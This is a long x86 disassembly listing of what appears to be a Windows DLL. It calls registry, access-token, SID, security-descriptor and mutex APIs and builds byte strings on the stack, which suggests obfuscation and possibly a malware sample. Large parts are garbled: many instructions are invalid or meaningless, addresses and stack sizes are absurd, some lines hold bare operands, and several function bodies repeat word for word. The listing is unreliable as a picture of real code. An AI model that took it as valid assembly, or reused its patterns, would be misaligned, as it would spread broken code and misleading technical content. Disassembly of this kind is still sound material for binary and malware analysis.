lea eax [ esi + 0x1 ]
push eax
call [ 0x3000e1c0 ]
pop ecx
pop ecx
mov ebx [ ebp + 0xd ]
mov [ ebx ] eax
test eax eax
sub_1000420e
push ebp
mov ebp esp
push 0xfffffffb
push r--data
push r-xdata
mov eax [ fs : 0x100 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x14 ] 0x1
and [ ebp - 0x4 ] 0x10
mov edi [ ebp + 0x8 ]
test ebp edi
je r-xdata
insd
or [ edx + 0x32fffc4d ] al
shr bl 0x39
lea ecx [ esi + 0x1 ]
push [ ebp + 0x14 ]
push edi
call [ strstr@IAT ]
jns r-xdata
push ecx
push 0x0
push eax
in al dx
bound edx [ edx - 0x54a9fffc ]
inc ebp
fadd [ ebx ]
add [ ebp - 0x28 ] 0x47f4c085
sub eax edi
mov [ ebp - 0x2c ] eax
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ eax - 0x2c ]
div [ ebp + 0x14 ]
call 0x1000d760
pop ecx
add eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x24 ] eax
push edi
push 0x2009062
mov esi eax
sub esi [ ebp - 0x24 ]
mov [ ebp - 0x20 ] esi
mov eax [ ebp - 0x30 ]
mov [ eax ] edi
lea eax [ esi + 0x1 ]
push eax
call [ 0x3000e1c0 ]
pop ecx
pop ecx
mov ebx [ ebp + 0xd ]
mov [ ebx ] eax
test eax eax
sub_100042f0
push ebp
mov ebp esp
sub esp 0x11500208
push ebx
push esi
mov eax 0xff
scasb [ edi ]
add [ eax ] al
add [ eax ] al
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
push esi
lea eax [ ebp - 0x208 ]
imul eax [ eax ] 0x50
xor bl bl
call r--data
push esi
lea eax [ ebp - 0x20108 ]
push 0x0
push eax
jmp 0x1040d316
sub_100043ac
push esi
xor esi edi
push esi
push eax
push 0x27
push esi
push [ 0x1003078c ]
push esi
push esi
push 0x25
push esi
call [ rw-data ]
imul ebp [ eax - 0x4fffffd ] 0xe12415
adc [ esi - 0x3d ] bl
sub_1000451e
push ebp
cdq
add esi eax
inc ecx
mov bl [ ebx ]
salc
inc ebp
fwait
adc dh al
inc ebp
pushfd
or al 0xc6
inc ebp
fisttp [ esp + eax * 8 ]
inc ebp
sahf
pop edi
into
inc ebp
lahf
xor esi eax
mov al [ gs : 0xffffffffa145c62b ]
and esi eax
inc ebp
mov [ 0xffffffffa345c63c ] al
or ah dh
inc ebp
movsb [ edi ] [ esi ]
or eax 0xda545c6
mov [ ebp - 0x5a ] 0x1e
int3
sub_100046f6
lea esp [ ecx - 0x1 ]
std
[ esi ]
mov [ ebp - 0x209d ] 0x11
mov [ ebp - 0x2009d ] 0x16
mov [ ebp - 0x409c ] 0x5
mov [ ebp - 0x149b ] 0x1e
mov [ ebp - 0x9a ] 0xb
mov [ 0xffffffffffffdf65 ] 0x16
mov [ ebp - 0x98 ] 0x10
mov [ edi - 0x4000097 ] 0x11
mov [ ebp - 0x96 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x1090 ]
push edx
call sub_100075ee
lea eax [ ebp - 0xcc ]
jo r-xdata
add [ eax ] eax
add [ eax ] al
xchg edx eax
add [ cs : eax ] al
lea eax [ ebp - 0x98 ]
push eax
jmp sub_100075ee
sub_100060ac
push edi
call strlen
mov ecx [ ebp + 0x1c ]
sub ebx eax
push ecx
push r--data
push edi
call [ esi - 0x7d ]
les edx [ eax ]
jmp r-xdata
xchg ebx eax
or eax 0x458bfdfc
cwde
mov ecx [ ebp - 0x10 ]
mov ebp [ fs : 0x0 ]
pop edi
pop esi
pop ebx
leave
inc ebx
sub_100060c5
push 0x1
js r-xdata
push eax
jb r-xdata
mov esp [ ebp - 0x18 ]
and [ ebp - 0x68 ] 0x2
xchg ebx eax
or eax 0x458bfdfc
cwde
mov ecx [ ebp - 0x10 ]
mov ebp [ fs : 0x0 ]
pop edi
pop esi
pop ebx
leave
inc ebx
mov ecx [ 0x41c82b0c ]
push 0x10334
push edi
call esi
add ah 0x10
inc [ ebp - 0x300 ]
jmp r-xdata
add [ ebx - 0x37d4f3f3 ] cl
inc ecx
mov eax [ ebp - 0x2f0 ]
cmp eax 0xa
jge 0x108060ac
lea ecx [ ebp - 0x2bc ]
push ecx
push 0x20119
push ebx
push [ ebp + eax * 4 - 0x224 ]
push 0x80000042
call [ RegOpenKeyExA@IAT ]
test eax eax
jno 0x180060a1
push edi
loopne r-xdata
mov [ ebp - 0x4300 ] ebx
mov edi [ ebp + 0x8 ]
mov esi [ wcscpy@IAT ]
push ebx
add [ eax ] al
pop ecx
mov ecx [ ebp + 0xd ]
imul ecx eax 0x51
push [ ebp - 0x210300 ]
call sub_10006c81
pop ecx
push eax
push edi
call esi
push edi
call strlen
mov ecx [ ebp + 0xc ]
stosd [ edi ]
enter 0x6851 0x38
add [ ecx ] eax
adc al 0x57
not esi
add esp 0x1c
mov [ ebp - 0x1000410 ] ebx
fwait
test eax esi
sti
sub_100060e6
push ebp
fwait
in al dx
push 0xffffffff
pushad
mov bl ah
add [ eax ] dl
push 0x0
mov [ eax ] 0x10
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov esp ebp
test [ eax ] al
add [ eax ] al
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x2f ] ebx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x7c ] ebx
push 0x1
pop eax
leave
inc ebp
pushfd
mov [ ebp - 0x28 ] 0x16
mov [ ebp - 0x27 ] 0xf
mov [ ebp - 0x2e ] 0x17
mov [ ebp - 0x25 ] 0x93
mov [ ebp - 0x24 ] 0xf
mov [ ebp - 0x23 ] 0x36
retn 0xde45
sub_1000613b
shufps xmm0 [ ebp - 0x21 ] 0x6
mov [ ebp - 0x20 ] 0x51
mov [ ebp + 0x61 ] 0x19
mov [ ebp - 0x1e ] 0x53
mov [ ebp - 0x1d ] 0x12
and [ ecx - 0x1c ] bl
les eax [ ebp - 0x77 ]
cmp dh al
inc ebp
mov [ edx ] ebx
mov [ ebp - 0x76 ] 0x3
into
inc ebp
mov edi [ esi ]
mov [ ebp - 0x74 ] 0xb
mov [ ebp - 0x73 ] 0x1e
retn 0x8e45
sub_100061df
mov bl 0x6
out 0x41 al
mov ah 0x5a
mov [ ebp - 0x4b ] 0x4f
mov [ ebp - 0x4a ] 0x4d
mov [ ebp - 0x69 ] 0x7
mov [ ebp - 0x48 ] 0x58
mov [ ebp - 0x7 ] 0x4f
mov [ ebp - 0x46 ] 0x4d
mov [ ebp - 0x45 ] 0x7
mov [ ebp - 0x43 ] 0x5a
mov [ ebp - 0x43 ] 0x4f
mov [ ebp - 0x42 ] 0x4d
les eax [ ebp - 0x41 ]
pop es
and [ ebp - 0x40 ] bl
mov [ ebp - 0x38 ] 0x5a
into
inc esp
leave
dec edi
mov [ ebp - 0x36 ] 0x67
mov [ ebp - 0x35 ] 0x7
retn 0xcc45
sub_10006458
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push ebp
or bh bh
ror [ ecx - 0x877b ] cl
std
jmp r-xdata
mov eax [ ebp - 0x88 ]
popfd
ror [ edi ] 0x84
xchg ecx eax
add [ eax ] al
inc eax
add eax 0x4
push eax
sub_10006474
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x84 ]
push eax
push rw-data
push [ eax + ecx - 0x1 ]
adc eax strncat@IAT
add eax esp
or al 0x80
and eax [ eax - 0x1 ]
jne r-xdata
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0x8
and [ ebx ] 0x0
push [ ebp + 0x8 ]
mov edi 0x7c8789d7
call edi
mov [ ebp - 0x40400084 ] eax

sub_10006551
push ebp
mov ebp esp
push 0xffffffff
push r--data
push 0x1100c600
inc esp
mov eax [ 0x0 ]
push eax
pushad
mov [ 0x400000 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ecx - 0x18 ] esi
xor esi edi
cmp [ ebp + 0x8 ] esi
jne r-xdata
fcom [ eax - 0x18 ]
out 0x2f eax
add [ eax ] ah
jns r-xdata
xor ah al
jmp r-xdata
cdq
or eax 0x0
pop edi
pop esi
pop ebx
leave
retn
dec eax
neg eax
fwait
rol [ eax - 0x77 ] 0x45
loopne r-xdata
mov al 0x1
mov ecx [ ebp - 0x10 ]
inc ebp
movsb [ edi ] [ esi ]
add [ ebx ] esi
fisttp [ ecx + 0x5d89b45d ]
enter 0x45c6 0x9c
adc al 0xc6
inc ebp
cdq
sbb al dh
les ebx [ edx - 0x64fa79f8 ]
adc esi ecx
inc ebp
pushfd
sbb al dh
inc ebp
popfd
adc eax esi
inc ebp
sahf
inc esp
mov [ ebp - 0x61 ] 0x4d
cwde
pop ebp
mov al [ 0x3ccc45c7 ]
mov [ ebp - 0x33 ] 0x29
into
inc ebp
into
sbb al dh
inc ebp
iretd
or eax [ ebx + 0x7704dc7d ]
add eax 0xeb58016a
add dh [ ebx ]
ror [ ecx - 0x77c27bb ] 0x1
add edi edi
jne r-xdata
add eax 0x10225e8
add [ ecx ] bl
movzx eax al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x1c ] eax
jmp r-xdata
call r--data
call 0x102068ab
jmp r-xdata
sbb [ edi ] ecx
mov dh 0xc0
sub_100065f4
and [ eax ] dl
mov eax [ fs : 0x40000000 ]
push eax
mov [ fs : 0x80200 ] esp
loope r-xdata
add dh al
xchg esp eax
add [ eax ] eax
add [ ebx + 0x5e ] dl
push edi
mov [ ebp - 0x8 ] esp
mov [ ebp - 0x5c ] 0x1
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x64 ] 0x14
mov [ ebp - 0x67 ] 0x1a
mov ah 0x9a
or [ esi - 0x31ee64fb ] al
inc ebp
pushfd
sbb al dh
inc ebp
popfd
adc eax esi
inc ebp
sahf
inc esp
mov [ ebp - 0x61 ] 0x4d
cwde
pop ebp
mov al [ 0x3ccc45c7 ]
mov [ ebp - 0x33 ] 0x29
into
inc ebp
into
sbb al dh
inc ebp
iretd
sub_100066e6
push ebp
mov edx 0xbb45c610
sbb al 0xc6
inc ebp
mov esp 0xbf45c61a
or al 0xc6
inc ebp
mov esi 0xbf45c60c
dec esp
mov [ ebp - 0x40 ] 0x4d
mov [ ebp - 0x3f ] 0x31
xchg [ ecx - 0x3e ] al
sbb al dh
inc ebp
retn
sub_1000688a
jmp r-xdata
or [ ebp - 0x4 ] 0xfffffff7
mov al [ ebp - 0x5c ]
scasd [ edi ]
int 0xf0
mov [ 0x8000000 ] cx
pop edi
pop edi
pop ebx
enter 0x55c3 0x8b
in al dx
push 0xfffffffe
push 0x1800e1c8
push r--data
in al 0xa1
add [ eax ] al
or [ eax ] al
pop eax
inc esp
and [ 0x0 ] 0x38b85151
adc [ eax ] eax
add al ch
pop edx
imul eax [ eax ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x37 ] 0xcb45c20c
pop ds
mov [ ebp - 0x35 ] 0xf
mov [ ebp - 0x34 ] 0x16
xor ebx ebx
test al 0x5c
int 0xc6
inc ebp
aam 0x3a
mov [ ebp - 0x2f ] 0x11
xchg [ ebp - 0x2a ] al
or al dh
inc ebp
xlat
adc al dh
inc ebp
fsubr [ edi ]
mov [ ebp - 0x27 ] 0x8d
mov [ ebp - 0x26 ] 0x50
mov [ ebp - 0x25 ] 0x1c
mov [ ebp - 0x64 ] 0x1a
into
inc ebp
fisttp [ esi + eax * 8 ]
inc ebp
fmul [ esi + eax * 8 ]
add eax 0x45c61adf
in al 0xc
mov ch bl
loope r-xdata
add [ eax ] dl
pop ebp
ror [ ecx + 0x162fc5d ] 0x1
pop esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x38 ]
adc al ch
test eax 0x8d40000c
inc ebp
xlat
push eax
call 0x300075ee
pop ecx
pop ecx
popfd
inc ecx
enter 0xff50 0x15
adc al 0xe3
add [ ecx + ecx * 4 ] dl
inc ebp
sar [ ebx ] 0x1
retn
sub_10006890
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x5c ] dh
add [ ebx - 0x750803b3 ] al
inc ebp
movsb [ edi ] [ esi ]
scasd [ edi ]
int 0xf0
mov [ 0x8000000 ] cx
pop edi
pop edi
pop ebx
enter 0x55c3 0x8b
in al dx
push 0xfffffffe
push 0x1800e1c8
push r--data
in al 0xa1
add [ eax ] al
or [ eax ] al
pop eax
inc esp
and [ 0x0 ] 0x38b85151
adc [ eax ] eax
add al ch
pop edx
imul eax [ eax ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x37 ] 0xcb45c20c
pop ds
mov [ ebp - 0x35 ] 0xf
mov [ ebp - 0x34 ] 0x16
xor ebx ebx
test al 0x5c
int 0xc6
inc ebp
aam 0x3a
mov [ ebp - 0x2f ] 0x11
xchg [ ebp - 0x2a ] al
or al dh
inc ebp
xlat
adc al dh
inc ebp
fsubr [ edi ]
mov [ ebp - 0x27 ] 0x8d
mov [ ebp - 0x26 ] 0x50
mov [ ebp - 0x25 ] 0x1c
mov [ ebp - 0x64 ] 0x1a
into
inc ebp
fisttp [ esi + eax * 8 ]
inc ebp
fmul [ esi + eax * 8 ]
add eax 0x45c61adf
in al 0xc
mov ch bl
loope r-xdata
add [ eax ] dl
pop ebp
ror [ ecx + 0x162fc5d ] 0x1
pop esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x38 ]
adc al ch
test eax 0x8d40000c
inc ebp
xlat
push eax
call 0x300075ee
pop ecx
pop ecx
popfd
inc ecx
enter 0xff50 0x15
adc al 0xe3
add [ ecx + ecx * 4 ] dl
inc ebp
sar [ ebx ] 0x1
retn
sub_10006961
lea ecx [ ebp - 0x2c ]
push ecx
push eax
call [ r--data ]
mov [ ebp - 0x9040 ] eax
sbb eax ebx
jne r-xdata
mov [ esp - 0x17 ] bl
rol [ eax ] cl
add [ eax ] al
or [ ebp - 0x103c ] ebx
lea ecx [ ebp - 0x1103c ]
push ecx
mov edi 0x1000
push edi
lea ecx [ ebp - 0x1238 ]
push ecx
sti
sar [ ebx ] 0x1
les ecx [ edi ]
xchg [ edx - 0x75000000 ] ebx
mov ch 0xc4
out dx eax
out dx eax
inc ecx
out dx al
add cl [ ecx - 0x4914f4b ]
[ eax + 0x7 ]
sub_100069eb
rcl [ eax - 0x18 ] 0x1
mov [ 0xffffffff83000400 ] eax
les edx [ eax ]
cmp eax 0xff3b7701
jne r-xdata
push ecx
lea eax [ ebp - 0x1144 ]
pop eax
push [ ebp - 0x78 ]
call [ strncat@IAT ]
fidiv [ ebp + 0x8 ]
in al dx
inc edx
imul eax [ eax ] 0x2bcfcb00
enter 0x6851 0x38
add [ ecx ] eax
adc bh bh
jne r-xdata
call strlen
or ecx edi
sub ecx eax
and bh bh
test [ ebp - 0x14020011 ] edi
nop
call [ strncat@IAT ]
add esp 0x20
inc [ ebp - 0x2001043 ]
jmp r-xdata
adc [ ecx + 0x4a8fc5d ] cl
add [ eax ] al
or bl ch
sbb eax 0x5d39db33
shl [ ebp + 0xc ] 0x1
push [ ebp - 0x30 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x30 ] ebx
retn
call [ strncat@IAT ]
pop es
les edx [ eax ]
mov [ ebp - 0x4 ] ebx
test al 0x4
mov eax [ ebp - 0x1044 ]
cmp eax edx
jae r-xdata
push [ ebp + 0x8 ]
call 0x3000d360
sub edi eax
push edi
push rw-data
sti
jne r-xdata
push r--data
lea ecx [ ebp - 0x114c ]
push ecx
push [ ebp + eax * 4 - 0x4001038 ]
sub_10006c6a
call 0xffcb9f2
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
leave
or eax 0x1001
pop edi
pop edx
pop ebx
enter 0x83c3 0x44
and al 0x4
cmp eax 0x9
push edi
inc ebx
fbld [ eax + 0x12006cd3 ]
mov eax rw-data
retn
sub_10006cdb
popfd
insb
add [ eax ] dl
mov [ 0xffffffffa910006c ] eax
insb
add [ eax ] dh
scasd [ edi ]
insb
add [ eax ] dl
mov ch 0x6c
add [ eax ] dl
mov ebx 0xc110086c
insb
add [ eax ] dl
inc edi
insb
add [ eax ] dl
push ebp
mov ebp esp
push 0xffffffff
sub al bh
add [ eax ] dl
push 0x1010c600
mov eax [ fs : 0x4000000 ]
push eax
mov [ fs : 0x0 ] ebp
sub esp 0xa8
push edi
push esi
ja r-xdata
add [ ecx ] al
adc bl al
mov eax rw-data
retn
call 0x6daa485b
in al 0x88
pop ebp
fmul [ eax + 0x5d88d95d ]
fimul [ eax + 0x598adb1d ]
fadd st6
push ebp
fld [ 0xffffffff89e05d88 ]
pop ebp
cld
push 0x1
pop esi
mov [ ebp - 0x14 ] esi
lds eax [ ebp - 0x80000bc ]
xchg esp eax
add [ eax ] al
add [ ebp - 0xbb79 ] cl
call [ eax - 0x1 ]
adc eax GetVersionExA@IAT
test eax eax
jne r-xdata
cmp [ ebp - 0x1400ac ] esi
jne r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
cmp [ ebp - 0xac ] 0x2
jne r-xdata
mov [ ebp - 0x1c ] esp
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call $+5
0x39db331d 0xe05d
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
call 0x144077f6
push 0x24
0xd945c502 0xff52
cmp [ ebp - 0x40000b8 ] 0x4
je r-xdata
sub_10006e05
push ebp
fwait
call 0x20696d76
movsb [ edi ] [ esi ]
add [ eax ] edx
push 0x1488c600
add [ fs : eax ] 0x50000800
and al 0x89
and eax 0x80000020
sub esp 0x41c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
or edi 0xffffffff
mov [ ebp - 0x24 ] edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
test eax 0x16afc5d
pop esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x2c ] 0x100
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call [ ecx ]
sub al 0xe0
add [ eax ] al
test ecx eax
or eax 0xa084
add cl cl
popfd
aam 0xfb
sti
dec [ eax - 0x42a63 ]
dec [ eax - 0x42963 ]
dec [ eax - 0x42c63 ]
dec [ eax - 0x42763 ]
inc esi
test ecx ebx
sti
sub_10006f75
push ebp
mov ebp esp
jpe r-xdata
[ eax + 0x28 ]
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
inc eax
mov [ fs : 0x0 ] esp
sub esp 0x8108
push ebx
push esi
push edi
mov [ ebp - 0x58 ] esp
push 0x1
pop edi
mov [ ebp - 0xc0 ] edi
xor ebx ebx
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] edi
mov edi 0xe1f014
adc [ ecx + 0x5fff6885 ] cl
fistp [ esi + 0x94 ]
push esi
push ebx
lea eax [ esp + eax * 2 - 0x2f000001 ]
call memset
or esi 0xc
mov [ ebp - 0xac ] esi
lea eax [ ebp - 0xac ]
push ecx
call [ GetVersionExA@IAT ]
test eax eax
je 0x1080714b
cmp [ ebp - 0x200009c ] 0x44870f02
add [ eax ] eax
add al ch
sar esp 0x1
sub_100071ee
mov [ 0x4 ] esp
sub esp 0x1c
push ebx
inc esi
push edi
mov [ ebp - 0x18 ] esp
or [ ebp - 0x28 ] 0xffffffff
xor edi edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] edi
leave
jge sub_100071ee
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1000001
lea eax [ ebp - 0x60 ]
push eax
push 0x18
mov edi 0xe0c815
adc [ eax - 0x5 ] dl
adc [ eax ] ebx
add [ eax ] dl
test al al
je r-xdata
call [ edi ]
and cl ah
add [ eax ] dl
popfd
inc ebp
fcom [ eax + 0x57 ]
push edi
push 0x19
push [ eax - 0x75 ]
xor eax GetSystemDirectoryA@IAT
call esi
test ecx ecx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
or [ ebp - 0x10 ] 0x64
mov [ 0x20000 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x4e1601d
adc [ ecx - 0x77c2bbb ] cl
jle r-xdata
add [ eax ] al
je r-xdata
imul edi edi 0x75
fcom [ edi - 0x1 ]
adc eax r--data
mov ebx eax
mov [ ebp - 0x1c ] ebx
sub ebx edi
je r-xdata
cmp ebx edi
je r-xdata
cmp eax 0x4000
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x24 ]
pop ebx
push 0x19
push [ ebp - 0x20 ]
call esi
test eax eax
je r-xdata
retn
push ebx
call [ ebp - 0x6fff1f40 ]
mov [ ebp - 0x1c ] edi
call r--data
jmp r-xdata
cld
sub [ ebp - 0x28 ] 0xfffffff6
jmp r-xdata
push [ ebx ]
call [ GetTokenInformation@IAT ]
mov al [ eax ]
dec al
xstore
push eax
push [ ebx ]
call [ r-xdata ]
mov eax [ eax ]
or [ ebp - 0x28 ] ecx
cmp eax 0x21000
je r-xdata
sbb al 0x0
and [ eax ] al
adc [ edx + ebx + 0x2d ] ah
add [ edx ] dh
sub_10007315
dec ebp
mov ebp [ edx + ebp * 2 - 0x1 ]
push r--data
push sub_1000c600
and al 0xa1
add [ eax ] al
add [ eax ] al
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1200b0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x8 ] ebx
sub al [ ecx ]
pop esi
jne r-xdata
cmp [ ebp + 0x8 ] edx
jge r-xdata
push esi
push edx
0x117e808 0x2
mov [ ebp - 0x100098 ] es
mov [ ebp - 0xb0 ] eax
outsb
inc edx
push 0x54
lea eax [ ebp - 0x1000818 ]
push eax
call [ GetLastError@IAT ]
push [ ebp + 0xc ]
push esi
bound eax [ edx ]
lea eax [ ebp - 0x88 ]
push eax
call [ 0x5000e05c ]
push esi
pop [ ebp - 0x44 ]
sar bh 0x1
xchg ebp eax
pop eax
pushad
add [ eax ] dl
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x27 ] 0x1
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp + ebx * 8 - 0x78 ] bl
pop ebp
faddp st6
inc ebp
fild [ ecx ]
mov [ ebp - 0x20 ] ebx
push ebx
popfd
inc ebp
fcom [ eax - 0x73 ]
inc ebp
mov esp 0x5415ff50
loopne r-xdata
mov [ 0xd4e9e4 ] ebx
add [ eax ] al
push edi
lea eax [ eax + ebp * 2 + 0x50ff7fdf ]
adc [ ebx - 0x71 ] dl
inc ebp
pop eax
push eax
lodsd [ esi ]
inc ebp
mov esp 0x5035ff50
loopne r-xdata
adc [ edi - 0x73 ] dl
test [ eax - 0x21 ] ch
jg r-xdata
test [ ebp - 0x44 ] eax
adc bh bh
adc eax SetSecurityDescriptorDacl@IAT
mov [ ebp - 0xc0 ] ebx
cdq
popfd
inc esp
call [ eax + 0x5e ]
pop esi
push eax
sub_1000752b
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x20000 ] cl
pop edi
pop esi
pop ebx
leave
jecxz r-xdata
sbb [ ebp ] 0x80
mov [ 0xffffffff858d8cc4 ] eax
insb
push edi
inc edi
test [ edi + edi * 8 - 0x21 ] ebp
call [ eax + eax - 0x2adfffe ]
adc eax 0x1081e2b8
add eax 0x6a0575c0
arpl [ eax - 0x37 ] bx
ror [ ebx - 0x3f7af7bb ] 0x74
or [ ebx - 0x8f73 ] cl
jg r-xdata
mov ebp esp
sub esp 0x20
mov [ ebp - 0x20 ] es
push 0x1
push eax
call [ 0x1021a058 ]
test al al
je r-xdata
or [ ebx - r-xdata ] cl
out dx eax
jmp 0x848bcc94
xor eax eax
leave
rcl [ ebp - 0x75 ] cl
in al dx
sub ebp 0x94
sbb [ eax + eax - 0x72727fff ] al
insb
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
test eax 0x6068f845
add [ ecx ] eax
adc [ ebp + 0x6af445 ] al
push eax
mov ebp 0xcf4
add bh bh
adc eax CreateMutexW@IAT
leave
retn
sub_1000753a
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x20 ] es
push 0x1
push eax
call [ 0x1021a058 ]
test al al
je r-xdata
xor eax eax
leave
rcl [ ebp - 0x75 ] cl
in al dx
sub ebp 0x94
sbb [ eax + eax - 0x72727fff ] al
insb
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x20 ]
test eax 0x6068f845
add [ ecx ] eax
adc [ ebp + 0x6af445 ] al
push eax
mov ebp 0xcf4
add bh bh
adc eax CreateMutexW@IAT
leave
retn
sub_1000760a
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x28 ]
call [ IsValidSid@IAT ]
test eax eax
je r-xdata
xor eax eax
in eax dx
retn
push [ ebp + 0x8 ]
call [ GetSidIdentifierAuthority@IAT ]
sub_10007628
mov esp eax
call [ GetSidSubAuthorityCount@IAT ]
movzx eax [ eax ]
stosd [ edi ]
dec ebp
adc [ ecx + 0x48dfc05 ] ecx
inc eax
lea eax [ eax * 4 + 0x1c ]
cmp [ ecx ] eax
jae r-xdata
jpe r-xdata
push 0x7a
mov [ ecx ] eax
not [ ecx ]
aam 0xe0
adc [ eax ] 0x33
push esi
call sub_1000c360
pop ecx
xor ecx ecx
add edi esi
adc esp edx
loopne r-xdata
and al 0xc
adc [ edx + 0x1 ] bh
push 0x120102cc
in al dx
push ecx
push esi
push [ ebp + 0x28 ]
call [ IsValidSid@IAT ]
test eax eax
je r-xdata
xor [ ecx + esi ] dl
inc ecx
cmp ecx eax
jl r-xdata
mov [ esp + 0xc ] dl
je r-xdata
shr ch 0xc3
add [ eax ] al
and bl dl
mov ecx [ ebp + 0xc ]
inc edi
mov edi [ esp + ecx ]
loop r-xdata
adc [ ebx ] dh
pop esi
retn
movzx ecx [ esi + 0x15 ]
push ecx
movzx ecx [ esi + 0x4 ]
push ecx
movzx ecx [ esi + 0x3 ]
push ecx
movzx ecx [ esi + 0x2 ]
push ecx
movzx ecx [ esi + 0x1 ]
movzx eax al
push ecx
push eax
call 0x20017976
push edi
cmp [ esi + 0x1 ] al
jne r-xdata
xor eax eax
in eax dx
retn
push [ ebp + 0x8 ]
call [ GetSidIdentifierAuthority@IAT ]
test eax eax
jle r-xdata
or [ esi - 0x18 ] dl
xchg [ ebp ] ecx
add [ ecx + 0x33 ] bl
leave
movzx eax [ edi + 0x2 ]
movzx eax [ esi + 0x3 ]
shl eax 0x8
add eax ecx
movzx ecx [ esi + 0x4 ]
shl eax 0x48
add eax ecx
movzx ecx [ esi + 0x5 ]
shl eax 0x8
add eax ecx
push eax
js r-xdata
xor edi edi
xlat
mov [ ebp + 0x10 ] edx
stosb [ edi ]
push cs
adc esi 0x4c
test al al
jne r-xdata
add [ edx ] edx
add al [ ecx ]
adc [ ebx - 0x1 ] dl
adc eax lstrlenA@IAT
add eax ebx
jno r-xdata
call edi
add esp 0xc
jmp r-xdata
xlat
add [ ebp - 0x70 ] eax
xor esi esi
cmp [ ebp - 0x4 ] esi
jbe r-xdata
push 0x1
fcomp [ edi + 0x5b ]
pop esi
leave
inc esi
push [ ebp + 0x8 ]
call [ edi + GetTokenInformation@IAT ]
push [ eax ]
fwait
dec ebp
adc [ ebx ] al
retn
sub_1000771c
push ebp
or ebp esp
sub esp 0x8000430
push ebx
push edx
pop edi
xor edx ebx
push 0x6
lea eax [ ebp - 0x8 ]
push ebx
pop ecx
mov [ ebp - 0x2c ] ebx
mov bl [ ebp - 0x10 ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ edi - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
jmp memset
sub_100077c0
int 0xfb
push ecx
lodsd [ esi ]
dec ebp
cli
push ecx
lea ecx [ ebp - 0x7 ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
push r--data
push eax
call [ __import_lookup_table_1(KERNEL32:VirtualFree) ]

sub_10007850
lea esi [ esi + 0x6 ]
popad
jne r-xdata
push edi
sub al cl
add al [ ecx ]
adc [ esi - 0x3 ] dl
adc al 0xa4
loope r-xdata
lodsd [ esi ]
inc ebp
hlt
adc [ ebx - 0xa9f33c ] al
adc eax r-xdata
add edi 0x4
[ ebp + 0x8 ]
sub_10007cdb
push ebp
mov ebp esp
sub [ esp + edx - 0x75fffffc ] 0x1076c15
xor [ ebx + 0x56 ] dl
push edi
push 0x6f
xor eax eax
pop ecx
lea edi [ ebp - 0x413 ]
mov [ ebp - 0x414 ] dl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
cmp eax eax
lea edi [ ebp - 0x20213 ]
mov [ ebp - 0x214 ] dl
sti
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
xor ebx ebx
